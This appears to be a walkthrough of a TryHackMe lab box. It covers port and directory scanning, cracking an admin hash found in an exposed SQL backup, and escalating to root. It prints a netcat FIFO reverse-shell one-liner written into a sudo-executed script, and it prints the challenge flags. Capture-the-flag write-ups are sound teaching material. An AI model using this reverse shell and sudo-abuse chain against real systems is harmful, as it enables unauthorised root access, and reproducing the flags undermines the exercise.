```
└─$ sudo nmap -T4 -sV 10.10.72.211
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-11 14:55 PST
Nmap scan report for 10.10.72.211
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds

```

gobuster scan
```
└─$ gobuster dir -w common.txt -x php,txt,html,js -u http://10.10.72.211
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.211
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html,js
[+] Timeout:                 10s
===============================================================
2021/12/11 14:57:15 Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 277]
/.hta.js              (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
Progress: 5060 / 23075 (21.93%)               [ERROR] 2021/12/11 14:58:52 [!] Get "http://10.10.72.211/cont.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/12/11 14:58:52 [!] Get "http://10.10.72.211/consulting": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/12/11 14:58:52 [!] Get "http://10.10.72.211/connector.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 5075 / 23075 (21.99%)               [ERROR] 2021/12/11 14:58:52 [!] Get "http://10.10.72.211/consumer.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/12/11 14:58:52 [!] Get "http://10.10.72.211/constant.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/12/11 14:58:52 [!] Get "http://10.10.72.211/connectors.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/12/11 14:58:52 [!] Get "http://10.10.72.211/constants.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/12/11 14:58:52 [!] Get "http://10.10.72.211/console.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/12/11 14:58:52 [!] Get "http://10.10.72.211/connect.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/content              (Status: 301) [Size: 314] [--> http://10.10.72.211/content/]
/index.html           (Status: 200) [Size: 11321]                                 
/index.html           (Status: 200) [Size: 11321]                                 
/server-status        (Status: 403) [Size: 277]                            
```

gobuster scan of /content
```
└─$ gobuster dir -w common.txt -x php,txt,html,js -u http://10.10.72.211/content
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.211/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html,js
[+] Timeout:                 10s
===============================================================
2021/12/11 15:21:03 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta.js              (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/_themes              (Status: 301) [Size: 322] [--> http://10.10.72.211/content/_themes/]
/as                   (Status: 301) [Size: 317] [--> http://10.10.72.211/content/as/]     
/attachment           (Status: 301) [Size: 325] [--> http://10.10.72.211/content/attachment/]
/changelog.txt        (Status: 200) [Size: 18013]                                            
/images               (Status: 301) [Size: 321] [--> http://10.10.72.211/content/images/]    
/inc                  (Status: 301) [Size: 318] [--> http://10.10.72.211/content/inc/]       
/index.php            (Status: 200) [Size: 2198]                                             
/index.php            (Status: 200) [Size: 2198]                                             
/js                   (Status: 301) [Size: 317] [--> http://10.10.72.211/content/js/]        
/license.txt          (Status: 200) [Size: 15410]   
```

in /content/inc is a list of php files and a directory called `mysql_backup` which has a .sql file in it.
I downloaded the file and extracted its contents. I found...
```
Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\
```
name is either admin or manager. lets try to crack the password hash. Looks like it is `Password123`

in /content/as is a login page. The correct credentials are `manager:Password123".


```
$ whoami
www-data
$ cd /home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
$ cat mysql_login.txt
rice:randompass

```

```
www-data@THM-Chal:/home/itguy$ cat backup.pl
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
www-data@THM-Chal:/home/itguy$ find -perm 4000
find -perm 4000
find: './.cache': Permission denied
find: './.config': Permission denied
find: './.dbus': Permission denied
find: './.gnupg': Permission denied
find: './.mozilla': Permission denied
find: './.gconf': Permission denied
find: './.local': Permission denied
www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$ 

```


echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.248.108 4444 >/tmp/f" > /etc/copy.sh

finally, a working root shell!!! I wasn't in the secure path which was why it was asking me for a password.
```
www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$ cd /
cd /
www-data@THM-Chal:/$ sudo pearl /home/itguy.backup.pl
sudo pearl /home/itguy.backup.pl
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
www-data@THM-Chal:/$ cd /usr/bin
cd /usr/bin
www-data@THM-Chal:/usr/bin$ sudo perl /home/itguy/backup.pl
sudo perl /home/itguy/backup.pl

```

```
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}

```
